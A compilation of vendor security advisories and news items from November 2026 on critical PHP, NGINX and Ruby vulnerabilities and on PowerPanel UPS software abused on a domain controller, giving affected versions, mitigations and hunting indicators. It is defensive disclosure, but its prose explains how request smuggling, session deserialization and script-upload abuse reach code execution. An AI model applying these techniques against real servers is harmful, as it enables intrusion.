Title: New PHP Vulnerabilities: What Organizations Need to Know and How Check Point Customers Are Protected
Context: CVE-2026-129289: the risk CVE-2026-129289 is a critical PHP vulnerability that lets an attacker smuggle a malicious request inside a malformed HTTP request
Full Text:
On November 19, 2026, A series of recently disclosed vulnerabilities in PHP has put one of the world’s most widely deployed web technologies under renewed scrutiny.

The most significant issues, CVE-2026-109618 and CVE-2026-109619, are critical remote code execution vulnerabilities that can allow an unauthenticated attacker to execute code on vulnerable PHP systems. CVE-2026-109618 carries a CVSS 4.0 score of 9.2 and has since been added to the CISA Known Exploited Vulnerabilities catalog.

A third issue, CVE-2026-115560, was disclosed shortly afterward. It involves a more specific PHP configuration and should be considered separately from the two original PHP2Shell vulnerabilities. Public reporting indicates PHP recommended temporarily disabling session upload progress for the affected configuration while awaiting the regular fix.

It lands just four weeks after PHP2Shell (CVE-2026-109618 and CVE-2026-109619), which attackers began exploiting within hours of disclosure. No exploitation of the new flaws has been reported so far. Given how fast PHP2Shell went from patch to attack, we don’t expect that window to stay open for long.

Check Point customers remain protected

Check Point has released IPS protections against attempts to exploit these PHP remote code execution vulnerabilities. Customers should ensure that their Security Gateways are running the latest IPS update and that the relevant protections are enabled in Prevent mode.

Check Point;s PHP Remote Code Execution advisories : CPAI-2026-15172 CPAI-2026-15184 covers CVE-2026-109618, CVE-2026-109619 and CVE-2026-115560 and is rated Critical.

CVE-2026-129289: the risk

CVE-2026-129289 is a critical PHP vulnerability that lets an attacker smuggle a malicious request inside a malformed HTTP request. This can bypass server access controls and lead to remote code execution.

How Check Point protects against it

Check Point Gateways prevent this attack by dropping non-compliant HTTP traffic. For full protection:

Make sure the Non Compliant HTTP inspection setting is activated and installed with the Access policy.

For HTTPS traffic, also enable HTTPS Inspection.

(Add here)

Importantly, IPS protection provides an additional layer of defense, but it does not replace updating PHP itself. Organizations should patch vulnerable installations as quickly as possible.

Here is what we know by now, who is exposed, and what to do about it.

What do we know by now

All seven critical flaws carry a CVSS 4.0 score of 9.2, and every one of them depends on specific configuration or runtime conditions. Several can lead to remote code execution (RCE).

CVE

Component

Branches

What has to be true

CVE-2026-129289

PHP-FPM request smuggling

8.2–8.5

The web server reuses FastCGI connections, and the app opens php://input without reading it fully. Can lead to unauthenticated code execution.

CVE-2026-115560

Sessions (serializer mismatch)

8.2–8.5

Session upload progress is on and session data is read with mismatched serializers. Left open by the October PHP2Shell fixes.

CVE-2026-126714

Sessions (default files handler)

8.2–8.5

An interrupted session write plus attacker influence over session data.

CVE-2026-129496

Date / timezone cache

8.2–8.5

A startup warning is logged (for example, an invalid date.timezone), then an early request warning hits a fresh worker.

CVE-2026-129474

Engine (use-after-free)

8.5 only

fatal_error_backtraces=1 (the 8.5 default) with zend.exception_ignore_args=0.

CVE-2026-129182

Engine (shutdown)

8.5 only

A fatal error while PHP restores memory-limit or zlib settings at shutdown.

CVE-2026-129481

Sessions (cleanup)

8.3–8.5

A fatal error in a callback during session cleanup.

Furthermore:

This is PHP2Shell’s unfinished business. CVE-2026-115560 was left open by the October patches, and CVE-2026-129182 and CVE-2026-129481 extend the fixes for CVE-2026-109619.

Session upload progress is now off by default. This is the feature PHP2Shell abused. Servers that set it explicitly keep it on.

A local path to root. CVE-2026-129291 (high) lets an attacker who can run code in a PHP-FPM worker execute commands with the FPM master’s privileges, which is often root.

The release also fixes bugs in PHP-CGI, PHAR signature checks, SOAP and the HTTP stream wrapper. Full technical advisories are published on the PHP project’s GitHub.

Who’s exposed

Any server running PHP 8.2 through 8.5 below the fixed versions is affected. Whether a given flaw is reachable depends on how PHP is deployed. The setups at highest risk:

PHP-FPM behind connection-reusing front ends. Nginx with fastcgi_keep_conn on, or Apache mod_proxy_fcgi with enablereuse=on (CVE-2026-129289). Reuse is off by default in both, so check custom configs and includes.

Apps that keep session upload progress on and mix serializers (CVE-2026-115560), for example code that switches session.serialize_handler at runtime.

PHP 8.5 deployments not using the production php.ini template, where zend.exception_ignore_args is left at 0 (CVE-2026-129474).

Shared hosting and multi-tenant FPM pools, where one tenant’s code could escalate to the FPM master’s privileges (CVE-2026-129291).

php-cgi with particular web server path mappings (CVE-2026-129538).

Two groups are easy to miss:

End-of-life PHP. PHP 8.1, 8.0 and 7.4 get no official release. The PHP security team published minimal source backports, and some vendors are shipping their own. PHP 8.2 itself reaches end of life on December 31, 2026.

PHP you didn’t install. Vendor products, appliances, admin portals and container base images often bundle their own PHP runtime. PHP2Shell showed that attackers go after exactly these edge-facing systems.

Organizations should look for PHP across:

Internet-facing websites and web applications

WordPress, Drupal, Joomla, Magento and other PHP-based environments

PHP-FPM and Apache/mod_php deployments

Shared hosting infrastructure

Containers and cloud workloads

Hosting and administration platforms

Commercial applications and appliances that bundle PHP

Legacy systems running unsupported versions of PHP

What needs to be done

Upgrade PHP to 8.5.13, 8.4.28, 8.3.37 or 8.2.36. Linux distributions often backport fixes without changing the version number, so check the package changelog for the CVE IDs instead of relying on php -v.

If you can’t patch today, apply the interim mitigations:

Disable session upload progress: set session.upload_progress.enabled=0 in php.ini or the FPM pool config. It can’t be changed with ini_set(). Restart all workers and verify the value through the web server, not the CLI. Uploads still work; only server-side progress bars stop.

Turn off FastCGI connection reuse (fastcgi_keep_conn in Nginx, enablereuse in Apache).

Disable catch_workers_output in PHP-FPM pools.

On PHP 8.5, set zend.exception_ignore_args=1.

For end-of-life PHP, apply your vendor’s backported fixes or the PHP security team’s source backports, and schedule the migration.

What should organizations do

Find every PHP instance

Inventory PHP across the environment.

Start with internet-facing systems, but include containers, cloud workloads, third-party products, appliances and applications that may bundle PHP internally.

Organizations using external hosting providers should also confirm which PHP version the provider is actually running.

Patch PHP, not just the application

Move supported PHP branches to their appropriate fixed releases.

Do not assume that updating WordPress, Drupal, Magento or another CMS resolves the issue. The underlying PHP runtime must be addressed.

After updating, restart PHP-FPM, Apache or the relevant web service and verify that the patched PHP version is actually running.

Treat unsupported PHP as a priority

Older versions create a different remediation challenge.

PHP’s current lifecycle information shows that PHP 8.1 and earlier are end-of-life. See PHP’s official branch status. [php.net]

For those systems, administrators should check whether their Linux distribution or commercial vendor provides a maintained backport. Where that isn’t possible, migration or isolation should be prioritized.

Reduce exposure where immediate patching isn’t possible

Where vulnerable systems cannot immediately be updated:

Restrict internet access.

Apply access controls where possible.

Segment affected web servers from sensitive internal systems.

Limit unnecessary outbound connectivity.

Consider temporarily taking particularly exposed systems offline.

These measures reduce risk, but they are not substitutes for applying the appropriate PHP security update.

Make sure preventive protections are enabled

Check Point customers should update IPS and verify that the PHP Remote Code Execution protections are active.

The Check Point advisory provides the applicable protection and configuration guidance for Security Gateway customers. Check Point PHP Remote Code Execution protection. [advisories…kpoint.com]

This follows CPR’s earlier operational guidance to keep critical IPS protections updated and use Prevent mode after appropriate validation. [COMMS week…y catch up | Teams]

Don’t stop at patching. Look backward.

Patching closes the vulnerability, but it does not determine whether the system was compromised before it was patched.

That consideration is particularly important now that CVE-2026-109618 appears in CISA’s Known Exploited Vulnerabilities catalog. See the NVD/CISA status. [nvd.nist.gov]

Security teams should therefore investigate vulnerable or previously vulnerable systems for indicators such as:

Web server or PHP processes unexpectedly spawning shells

New or unfamiliar PHP files appearing in web roots

Unexpected outbound connections from web servers

Unusual HTTP requests to PHP endpoints

PHP worker crashes or unexplained service restarts

These behaviors are consistent with the hunting guidance developed in CPR’s PHP2Shell_Threat_Report_CVE-2026-109618_109619. [PHP2Shell_…618_109619 | PDF]

How Check Point protects customers

Check Point has released IPS protections covering both CVE-2026-109618 CVE-2026-109619 Customers with IPS enabled on Check Point Security Gateways are protected.

Stay up to date with the Vulnerability Response Point

When critical vulnerabilities hit, head to the Check Point Vulnerability Response Point for live research as events unfold. It helps you understand:

What’s at risk

What to patch

How to stay protected

Check Point Research continues to monitor for exploitation and will update this post as more becomes known.

[R1] Stand-alone Security Patch Available for Tenable Security Center Versions 6.6.0, 6.7.2, 6.8.0, 6.9.1: SC-202611.1 Arnie Cabral Thu, 11/19/2026 - 13:10

Title: Two Critical NGINX HTTP/2 Flaws: What to Patch First
Context: Threat intelligence adds context on whether exploit code is public or attacks are underway, so you can rank a flaw like this against everything else on your list
Full Text:
The web server in front of your applications can now be taken over by someone with no login and no help from your own code. Two critical NGINX flaws, CVE-2026-123007 and CVE-2026-123633, make that possible when HTTP/2 is on. F5 and the NGINX project released fixes on November 18, 2026.

Our research team published a full advisory on the NGINX HTTP/2 flaws with version tables, mitigations, and hunting guidance.

Check Point WAF SaaS, Not Vulnerable – Our R&D team assessed these critical NGINX vulnerabilities and found that Check Point WAF as a Service (SaaS) is not vulnerable to them. The way the platform is built and configured doesn’t enable the conditions an attacker would need to exploit them. No customer action is required.

What the flaws do

HTTP/2 lets many requests, called streams, share one connection. NGINX tracks how much data it may send on that connection with a flow-control counter. CVE-2026-123007 breaks that accounting: a canceled stream’s refund pushes the counter past its limit, a later check wraps around, and an invalid length becomes an out-of-bounds memory copy.

The bug has been in NGINX since version 1.9.5, so it covers every release since HTTP/2 support arrived in 2015. Researchers ran code on a server that only served static files, with no backend application and no third-party modules.

CVE-2026-123633 is a use-after-free in connection handling. When NGINX acts as a reverse proxy and runs low on connection slots, it frees a busy connection mid-request and keeps using the memory. It affects NGINX from version 1.19.7.

How CVE-2026-123007 moves from an HTTP/2 session to code execution, with a summary of both flaws

F5 rates both flaws 9.2 on CVSS v4.0. Neither needs authentication. An attacker only has to open an HTTP/2 connection.

Why the front door is key

NGINX typically terminates HTTPS and routes requests to the applications and APIs behind it. One compromised server can expose the traffic, credentials, and secrets for every site it fronts. Failed attempts crash workers, which gives your team a signal to watch.

Researchers also chained a separate, unpatched Linux SCTP flaw to reach root and escape a container. Blocking the SCTP kernel module where you don’t need it closes that path until a kernel fix ships.

Where exploitation stands

A public proof-of-concept exploit exists for CVE-2026-123007, and national CERTs in Japan, Poland, and France issued alerts. As of November 18, 2026, there are no confirmed attacks in the wild, and neither CVE is in the CISA Known Exploited Vulnerabilities catalog.

The public exploit needs about 128 GB of HTTP/2 traffic on one connection and an AVX-512 processor, and it likely fails through a proxy. That slows mass attacks. Targeted attacks face a lower bar.

Three common controls will not carry you here. Researchers defeated ASLR by leaking memory first, WAF rules don’t inspect the HTTP/2 control frames involved, and access logs don’t record them.

Key numbers from the advisory, as of November 18, 2026.

Find your NGINX first

A server is exposed when three things are true: it runs an affected version, it accepts HTTP/2, and an attacker can reach it. Affected versions are NGINX Open Source 1.9.5 to 1.30.6 and 1.31.0 to 1.31.8, plus NGINX Plus 37.x before the fixed builds and NGINX Plus R34 to R36, which get no fix.

Check the version and configuration on the server, then confirm from outside whether it offers HTTP/2. If the second command prints ALPN protocol: h2, HTTP/2 is on.

nginx -v; grep -rnwE 'http2' /etc/nginx/

openssl s_client -connect <host>:443 -alpn h2 </dev/null 2>/dev/null | grep ALPN

Don’t close a finding on the version string alone. Linux distributions often backport fixes without changing the version number, and Ubuntu and Red Hat fixes were still pending on November 18. NGINX inside appliances, ingress controllers, and container images isn’t fixed by operating system updates. The retired Kubernetes ingress-nginx project won’t ship a fix for CVE-2026-123633, so plan a move to a maintained controller.

Where NGINX runs beyond a dedicated web server, and what to do in each case

What to do now

Inventory every NGINX instance, including container images, ingress controllers, load balancers, appliances, and origin servers behind your CDN.

Run the external HTTP/2 check on each internet-facing host and put servers that offer HTTP/2 at the top of the list.

Upgrade internet-facing servers to NGINX 1.30.7 or 1.31.9, or NGINX Plus 37.0.8.1 or 37.3.0.1.

Turn off HTTP/2 on listeners that must wait for a fix. gRPC needs HTTP/2 and breaks without it, so patch those services instead.

Restart NGINX after upgrading, because a reload keeps the old binary. Rebuild container images, then rerun the checks to confirm.

Then hunt for signs of earlier attempts: repeated worker crashes in the error log, NGINX workers starting shells or opening new outbound connections, unusually large and long-lived HTTP/2 sessions, and floods of WINDOW_UPDATE or RST_STREAM frames. None of these proves a compromise, and their absence doesn’t prove a server is safe.

The same release fixes three more critical flaws in the DNS resolver, HTTP/3, and the mail proxy. Turning off HTTP/2 doesn’t block them, so upgrading is the complete fix. Internal servers count too, since an attacker with a foothold in your network can use these flaws to move laterally.

What this means for Check Point WAF customers

Check Point R&D has assessed all five critical NGINX vulnerabilities disclosed in November 2026: CVE-2026-123007, CVE-2026-123633, CVE-2026-123634, CVE-2026-121810, and CVE-2026-113425.

WAF SaaS and WAF Agent Docker deployments (standalone)

Check Point WAF SaaS is not vulnerable to these five vulnerabilities, and neither are Check Point WAF Agent Docker images deployed with Check Point’s default configurations. In both cases, the configuration doesn’t enable the conditions required for exploitation:

HTTP/2 flaws (CVE-2026-123007, CVE-2026-123633): HTTP/2 is disabled on the WAF application listeners.

Resolver flaw (CVE-2026-123634): The standard WAF SaaS configuration and the default WAF Agent configuration don’t enable SSI or mirror subrequests.

HTTP/3 flaw (CVE-2026-121810): HTTP/3 and QUIC aren’t enabled.

Mail proxy flaw (CVE-2026-113425): Neither WAF SaaS nor WAF Agent uses NGINX mail proxy functionality.

WAF SaaS customers aren’t exposed to these five vulnerabilities through the assessed deployment configuration, and no customer action is required.

WAF Agent virtual machine deployments (IaaS)

For WAF Agent deployments that use Check Point-provided VM images, the assessment looks at the deployment architecture and the components handling incoming traffic:

Behind a cloud-managed load balancer (default and recommended): Check Point recommends deploying WAF Agent VMs behind cloud-managed Application Load Balancers (ALBs). Follow your cloud provider’s security advisories and remediation guidance for the managed load balancer infrastructure.

Without a load balancer: Check Point WAF Agent blocks all currently observed exploitation attempts associated with these five vulnerabilities, including where the VM is directly exposed. Check Point still recommends upgrading to the latest WAF Agent version available in the Check Point Portal, which incorporates the official NGINX security fixes.

Behind a customer-managed NGINX front end: If you run a separate NGINX reverse proxy in front of your WAF VMs, assess its version and configuration against the published CVEs and apply the relevant security updates where required.

Updated WAF Agent images for Docker and VM deployments

As an additional security measure, Check Point is preparing updated WAF Agent Docker and VM images based on NGINX version 1.30.7, with the latest official security fixes. Once the updated images are released:

Automatic upgrade enabled: You’ll receive the NGINX security update through the automatic upgrade process, with no manual intervention.

Automatic upgrade disabled: You must upgrade to the latest Check Point WAF Agent version as soon as it’s available.

Check Point strongly recommends keeping automatic upgrades enabled, so security fixes and product updates are deployed on time. You can upgrade your WAF Agent to the latest available version through the Check Point Portal. For details, see the WAF Agent upgrade instructions.

Check Point continues to monitor emerging security vulnerabilities and validate its protection capabilities to maintain the security and resilience of its WAF SaaS platform.

Closing the gap between advisory and action

An advisory gives you a list of affected versions. Your team still has to find where those versions run, which ones an attacker can reach, and which to fix first. That work takes time when NGINX sits in appliances, containers, and servers that nobody has looked at in years.

Exposure management shortens that path. Check Point Exposure Management brings together asset discovery, attack surface management, threat intelligence, prioritization, validation, and remediation guidance in one workflow. It shows where affected software runs across your internet-facing and internal assets, including servers outside your inventory.

Threat intelligence adds context on whether exploit code is public or attacks are underway, so you can rank a flaw like this against everything else on your list. Validation confirms whether an exposure is exploitable in your environment. Remediation guidance then helps your team fix issues in order of risk, with 160+ integrations and a 20-minute agentless setup.

Title: 'November2Shell' Continues with 7 Patched Ruby Vulnerabilities
Context: Ruby2Shell highlights a familiar challenge in vulnerability response: knowing a fix is available doesn’t mean the risk is resolved
Full Text:
TL;DR

Ruby fixed seven vulnerabilities in string case conversion and regular expression handling, with proof-of-concept exploits showing that some can lead to remote code execution.

Organizations should upgrade to Ruby 3.3.14, 3.4.13, or 4.0.10 and check vendor updates for Ruby bundled with applications or container images.

Ruby has released security updates for seven vulnerabilities in its string case-conversion and regular-expression code. One of the flaws, known as Ruby2Shell (CVE-2026-132825), can cause a heap buffer overflow when Ruby changes the case of a crafted string. The other vulnerabilities affect regular-expression compilation, matching, and conversion.

Ruby’s security team says proof-of-concept exploits show that some of these issues can lead to remote code execution in certain scenarios. However, the risk depends on how an application uses Ruby, for example, whether it processes attacker-controlled strings or regular-expression patterns.

How Ruby Applications Are Impacted

Ruby is a programming language used to build web applications, automation tools, and other software. It powers popular frameworks such as Ruby on Rails and is also included in self-hosted platforms and developer tools, so a vulnerability in Ruby itself can affect many kinds of applications.

Ruby 3.3.13 and earlier, 3.4.0-3.4.12, and 4.0.0-4.0.9 are all impacted by these vulnerabilities. The exact risk depends on how the application processes that input, but Ruby warns that some of the flaws can enable remote code execution in certain scenarios. The table below summarizes the advisories and potential impact.

Vulnerability

Overview

CVE-2026-132825 (Ruby2Shell)

Changing the case of a crafted string can cause a one-byte heap buffer overflow, potentially leading to remote code execution in some scenarios.

Sonatype-2026-012807(CVE requested, not yet assigned at publication)

Compiling a crafted regular-expression pattern can trigger a double free, potentially leading to remote code execution when an application compiles attacker-controlled patterns.

Sonatype-2026-012808(CVE requested, not yet assigned at publication)

Case conversion can trigger an integer overflow and heap buffer overflow. Changing the case of a crafted string may lead to remote code execution.

Sonatype-2026-012809(CVE requested, not yet assigned at publication)

Matching against a crafted regular-expression pattern can cause an out-of-bounds read. Ruby reports that this flaw may lead to attacker-controlled memory corruption in some scenarios.

Sonatype-2026-012810(CVE requested, not yet assigned at publication)

Compiling a crafted regular-expression pattern can trigger an integer overflow and heap buffer overflow, potentially leading to remote code execution in applications that compile attacker-controlled patterns.

Sonatype-2026-012811(CVE requested, not yet assigned at publication)

Converting a crafted regular expression with Regexp#to_s can cause a heap buffer overflow, potentially exposing information or enabling remote code execution in some scenarios.

Sonatype-2026-012812(CVE requested, not yet assigned at publication)

Matching a crafted string with a case-insensitive backreference can cause an out-of-bounds read, potentially disclosing memory contents or crashing the process.

What Companies Should Do Now

Treat these Ruby vulnerabilities as an urgent patching issue, and organizations should upgrade to a fixed version as soon as possible. Sonatype’s Security Event on these vulnerabilities tracks current guidance and response recommendations.

Ruby2Shell highlights a familiar challenge in vulnerability response: knowing a fix is available doesn’t mean the risk is resolved. Organizations need to find every affected Ruby runtime, identify who owns the update, and make sure the patched release reaches production, including Ruby bundled in products and services.

Organizations should:

Inventory systems running Ruby. Check production servers, containers, build images, serverless environments, and self-hosted products that bundle Ruby. Confirm the version actually running in production and not just the version listed in the development file.

Prioritize patching Rails and classic-style Sinatra applications first.

Update to 4.0.10, 3.4.13, or 3.3.14. Rebuild images and restart application processes so the fix is active.

If you are currently using Ruby 3.2 or earlier, it is end of life (EOL) and no fixes are available. Move all workloads to a supported version of Ruby.

For ongoing details and links to current advisories, see the official Ruby security advisory.

Title: PHP Patches 7 Critical Flaws, Including Session and PHP-FPM Remote Code Execution (CVE-2026-115560, CVE-2026-129289)
Context: 0 (released with the fixes) These ranges apply to CVE-2026-115560, CVE-2026-129289 and most of the other vulnerabilities in the release; a few affect only some branches (see below)
Full Text:
On November 19, 2026, the PHP project released PHP 8.2.36, 8.3.37, 8.4.28 and 8.5.13, fixing 17 vulnerabilities. Seven are rated critical by the PHP project (CVSS 4.0 9.2), including CVE-2026-115560, a session serializer mismatch that can lead to remote code execution, and CVE-2026-129289, a PHP-FPM request smuggling flaw that lets an unauthenticated attacker forge a backend request and execute attacker-controlled PHP code. PHP 8.6.0, released the same day, already includes the fixes.

PHP runs a large share of the world’s websites and web applications, in virtual machines, containers and managed platforms alike. CVE-2026-115560 was pre-announced in October, a few days after the PHP2Shell fixes (CVE-2026-109618, CVE-2026-109619), with the mitigation of disabling session upload progress. Today’s release publishes its full details and fixes it alongside 16 other vulnerabilities. Several of them need specific configurations, but the release as a whole affects every supported PHP branch.

PHP November 2026 security release: key facts

Fact

Detail

CVEs

17 in total; critical: CVE-2026-115560, CVE-2026-129289, CVE-2026-126714, CVE-2026-129496, CVE-2026-129481, CVE-2026-129474, CVE-2026-129182

Type

Deserialization of untrusted data (CWE-502) in the session extension; HTTP request smuggling (CWE-444) in PHP-FPM; several use-after-free bugs

Severity

Rated critical by the PHP project (CVSS 4.0 9.2) for all seven; NVD score pending

Required configuration

CVE-2026-115560: session upload progress enabled and mismatched session serializers. CVE-2026-129289: PHP-FPM behind a front end that reuses FastCGI connections

Affected versions

PHP 8.2.0 to 8.2.35, 8.3.0 to 8.3.36, 8.4.0 to 8.4.27 and 8.5.0 to 8.5.12 (some CVEs affect only some branches)

Fixed versions

8.2.36, 8.3.37, 8.4.28, 8.5.13; PHP 8.6.0 includes the fixes

Exposure

Internet-facing PHP applications; exploitability depends on configuration and on the application

Workaround

Set session.upload_progress.enabled = 0 (CVE-2026-115560); disable FastCGI connection reuse on the front end (CVE-2026-129289); other CVEs have their own workarounds

Exploitation

No known in-the-wild exploitation; a public proof of concept exists for CVE-2026-115560 in a lab setup

What is CVE-2026-115560?

CVE-2026-115560 is a flaw in PHP’s session upload progress feature. When a client uploads a file, PHP writes the upload’s progress into the user’s session, including a value the client controls. PHP supports several session serialization formats, and if that data is written in one format (php_serialize or php_binary) and later read in another (php), the reader can treat attacker-supplied bytes as serialized object data.

This can happen when an application switches session.serialize_handler at runtime before calling session_start(), or when separate applications, PHP-FPM pools, virtual hosts or command-line jobs with different settings share the same session storage. If the reading application has a suitable deserialization gadget chain, the attacker can execute code with the privileges of the PHP worker. According to the PHP advisory, the original report demonstrated command execution with a Guzzle gadget on PHP 8.2.35, 8.3.36, 8.4.27 and 8.5.12, and with a Monolog gadget.

The fix turns session upload progress off by default and blocks runtime changes to session settings while the feature is enabled. An explicit session.upload_progress.enabled = 1 in existing configuration still overrides the new default, and the PHP project notes that matching serializers across separate configurations is still the administrator’s responsibility.

What is CVE-2026-129289?

CVE-2026-129289 is an HTTP request smuggling flaw in PHP-FPM. When an application opens php://input but does not read the request body to the end, PHP can leave the unread bytes on a persistent FastCGI connection. An attacker can place a crafted FastCGI message in that body, and PHP-FPM accepts it as a new request that the web server never created or authorized.

The forged request controls FastCGI parameters, including the script to run and administrator-level PHP settings, which lets the attacker execute attacker-controlled PHP code as the worker in a single unauthenticated request, provided they know the path of an existing PHP script on the server. According to the PHP advisory, no non-default PHP setting, memory corruption or race condition is needed, and the bug has existed since PHP 5.6.0.

Exploitation requires a front end that reuses backend connections, such as nginx with fastcgi_keep_conn on, Apache mod_proxy_fcgi with enablereuse=on, or HAProxy FastCGI applications that keep connections open. Standard nginx and Apache configurations that close the FastCGI connection after each request are not affected by the demonstrated attack. LSAPI is affected by the same cleanup bug, but the advisory does not establish code execution through LSAPI.

These ranges apply to CVE-2026-115560, CVE-2026-129289 and most of the other vulnerabilities in the release; a few affect only some branches (see below). PHP 8.1 and older are end of life and received no release, although the PHP project notes that older versions may also be affected (session upload progress was introduced in PHP 5.4.0). Linux distributions often backport fixes without changing the PHP version number, so check your distribution’s security tracker as well as the version string. PHP bundled in container images and application platforms needs its own update.

Additional vulnerabilities fixed in the same release

The other five critical vulnerabilities (all CVSS 4.0 9.2 according to the PHP project):

CVE-2026-126714 (8.2 to 8.5): partially overwritten session files can lead to remote code execution. Requires attacker influence over session data, an interrupted write and a gadget chain. Disabling session upload progress removes one input path but is not a full fix.

CVE-2026-129496 (8.2 to 8.5): a timezone cache use-after-free can lead to remote code execution. Requires a startup diagnostic and PHP error logging to a file; code execution was demonstrated locally in PHP-FPM and Apache mod_php under additional assumptions.

CVE-2026-129481 (8.3 to 8.5): use-after-free after an interrupted session shutdown. Code execution has not been demonstrated. Disabling session upload progress does not address it.

CVE-2026-129474 (8.5 only): use-after-free in magic method backtraces can lead to remote code execution, confirmed by the PHP project on PHP 8.5. It depends on the application and requires bypassing address randomization.

CVE-2026-129182 (8.5 only): use-after-free in the fatal error backtrace after shutdown. Code execution through this path has not been demonstrated.

The release also fixes four high-severity issues: a PHP-FPM epoll use-after-free that allows local privilege escalation to root when the FPM master runs as root (CVE-2026-129291, affecting configurations with catch_workers_output enabled, including the official PHP-FPM Docker images), a denial of service through folded HTTP response headers (CVE-2026-127960), mixed-case HTTPS and FTPS URLs that can send data in plaintext (CVE-2026-128064), and a PHAR signature bypass (CVE-2026-128090). Six medium-severity issues affect PHP-CGI, SOAP, DOM, the URI extension and the PHP-FPM status page.

Is there a patch for CVE-2026-115560 and CVE-2026-129289?

Yes. PHP 8.2.36, 8.3.37, 8.4.28 and 8.5.13 were released on November 19, 2026 and are available on the PHP downloads page. PHP 8.6.0, released the same day, includes the same fixes. Linux distributions, container image maintainers and hosting platforms that ship PHP need to release their own updated packages.

How to mitigate the PHP vulnerabilities

The best fix is to upgrade to the fixed release for your branch. Each critical vulnerability has a different workaround, and no single setting covers all of them.

Inventory: find every PHP installation, including PHP in container images, PHP-FPM pools and application platforms, and note which ones run PHP-FPM behind nginx, Apache or HAProxy.

Upgrade: move to PHP 8.2.36, 8.3.37, 8.4.28, 8.5.13 or 8.6.0, then restart the PHP master process and all workers.

CVE-2026-115560: set session.upload_progress.enabled = 0 in php.ini or the FPM pool configuration. Calling ini_set() from the application is too late. Check for explicit settings that re-enable it, even after upgrading.

CVE-2026-129289: disable FastCGI connection reuse: leave nginx fastcgi_keep_conn off, leave Apache enablereuse off, or configure other front ends to close the backend connection after each request. Never expose PHP-FPM listeners to untrusted networks.

CVE-2026-129474 and CVE-2026-129182 (PHP 8.5): set zend.exception_ignore_args = 1 or fatal_error_backtraces = 0.

CVE-2026-129496: fix configuration errors that produce startup warnings, or send PHP errors to syslog instead of a log file.

CVE-2026-129291: disable catch_workers_output in affected FPM pools, and avoid running the FPM master as root where possible.

Prioritize internet-facing PHP-FPM servers behind connection-reusing front ends, and applications that share session storage or change session settings at runtime.

Is CVE-2026-115560 being exploited in the wild?

There are no known reports of in-the-wild exploitation of any of the vulnerabilities, and none is listed in CISA’s Known Exploited Vulnerabilities catalog. A public proof-of-concept exploit for CVE-2026-115560 has been available on GitHub since October, but it targets a deliberately vulnerable lab application with a built-in gadget. With full technical details for all 17 vulnerabilities now public, especially for the PHP-FPM request smuggling flaw, exploit attempts are likely to follow.

How can Orca help?

Orca enables customers to quickly identify assets running vulnerable PHP versions, including PHP installed from OS packages and PHP bundled in container images, and to understand their exposure in context, including internet accessibility, runtime reachability and asset criticality, so they can prioritize remediation based on real risk rather than CVSS alone.

Title: CyberPower PowerPanel Exploited to Run Malicious Code on Domain Controller
Context: An attacker has abused CyberPower's PowerPanel Business (PBB) software to run malicious scripts on a domain controller, the server that controls logins across a Windows network,...
Full Text:
An attacker has abused CyberPower's PowerPanel Business (PBB) software to run malicious scripts on a domain controller, the server that controls logins across a Windows network, turning a power management feature into a remote command channel.

Symantec detailed the intrusion in research published November 18. PowerPanel Business manages uninterruptible power supply (UPS) battery backups. Because organizations rely on it to shut servers down safely in an outage, it often runs on important systems such as hypervisors and database and file servers.

How the UPS Software Was Abused

Administrators can configure PPB to launch a script when it detects a power problem, and its service executes that script with SYSTEM privileges, the highest level in Windows. Symantec said this meant the attacker could run code without a software bug and without setting up a service or scheduled task.

According to Symantec, the attacker uploaded scripts through the web console, then used them to stage an antivirus killer and copy the Active Directory database, which stores credentials for every account on the network. A persistent implant followed, loaded through DLL sideloading, in which a legitimate program is tricked into loading a malicious library.

The attacker leaned mostly on tools that ship with Windows, and the data collection scripts were rewritten several times during the intrusion. Symantec read that trial and error as a sign of a human operator working live.

Read more on management software attacks: Chinese State Actor Used AI to Compromise ConnectWise Tenants

What Defenders Should Check

Symantec did not say how the attacker got into the network or onto the PPB console. Possible routes to the console, it said, included stolen administrator credentials and previously disclosed weaknesses in the product, such as a default administrator password, hard-coded credentials and a file upload flaw.

Symantec said the feature "simply accepts a script, stores it, and runs it as SYSTEM." Since PPB often sits on the machines an attacker would prize most, it urged organizations to treat power-management software with the same suspicion as remote administration tools.

Its advice included limiting console access to specific administrator machines, keeping the console off the internet, replacing the default administrator password and staying patched. It also told organizations to check the folders PPB runs scripts from, assume any unfamiliar script is malicious, reset Active Directory credentials if indicators turned up and protect power-management hosts as high-value systems.

Symantec did not identify the victim or link the activity to any known group. With no data theft or ransomware seen, it said the attackers' motives remained unclear.

Title: PHP Releases Patches to Fix 18 Vulnerabilities
Context: The PHP Foundation has released security patches for a new set of 18 vulnerabilities, seven of which are marked critical
Full Text:
The PHP Foundation has released security patches for a new set of 18 vulnerabilities, seven of which are marked critical.

These vulnerabilities affect all supported PHP versions but require either non-default configuration or uncommon setups to be exploited.

This set of newly disclosed PHP vulnerabilities come a month after the disclosure of two critical flaws in PHP, tracked as CVE-2026-109618 and CVE-2026-109619 and collectively known as ‘PHP2Shell.’

This was not merely a theoretical risk. In the weeks following the disclosure, security researchers began documenting real-world exploitation attempts and compromises involving internet-facing systems, demonstrating the potential consequences of leaving vulnerable PHP installations unpatched.

For example, Check Point reported campaigns exploiting PHP2Shell against its own security gateways, dating back to 30 October. The attacks involved the deployment of backdoors and even destructive tools targeting VMware ESXi virtualisation servers.

The exploitation activity also extended to Palo Alto Networks firewalls, with attackers targeting devices whose administrative interfaces were exposed to the internet.

Of the flaws published in the November update one is a remote code execution (RCE) vulnerability in session upload progress, tracked as CVE-2026-115560. It was disclosed by PHP on October 23, two days after PHP released emergency fixes for the critical PHP2Shell vulnerabilities. It has been noted that exploitation of this vulnerability requires a highly specific and unlikely combination of conditions.

PHP Session Handling Flaws Enable Remote Code Execution

One of the new critical flaws, dubbed ‘PHPAfterShell’ and tracked as CVE-2026-126714, was discovered by security firm Depthfirst using AI frontier models tuned for cybersecurity tasks.

The vulnerability lives in PHP’s session handling with file-based storage, the default (session.save_handler = files).

By exploiting a flaw in this process, an attacker can manipulate a session while a file is being uploaded, potentially tricking the server into executing arbitrary code.

Successful exploitation could allow a remote attacker access to sensitive information, including login credentials and customer records, modify session data, spy on visitors or disrupt the affected service.

It affects the following versions:

PHP 8.5 < 8.5.13

PHP 8.4 < 8.4.28

PHP 8.3 < 8.3.37

PHP 8.2 < 8.2.36

PHP 8.1 and earlier are end-of-life

PHP Security Patches Address 16 Additional Vulnerabilities

The other vulnerabilities addressed in PHP’s 19 November 2026 security release include the following:

